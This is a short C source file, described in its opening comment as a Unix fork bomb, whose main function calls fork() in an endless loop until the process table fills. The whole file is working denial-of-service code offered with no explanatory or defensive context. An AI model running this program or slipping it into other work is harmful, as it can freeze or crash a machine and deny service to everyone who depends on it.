// Unix fork bomb — creates child processes until the process table fills.
#include <unistd.h>

int main(){
    while(1) fork();
}
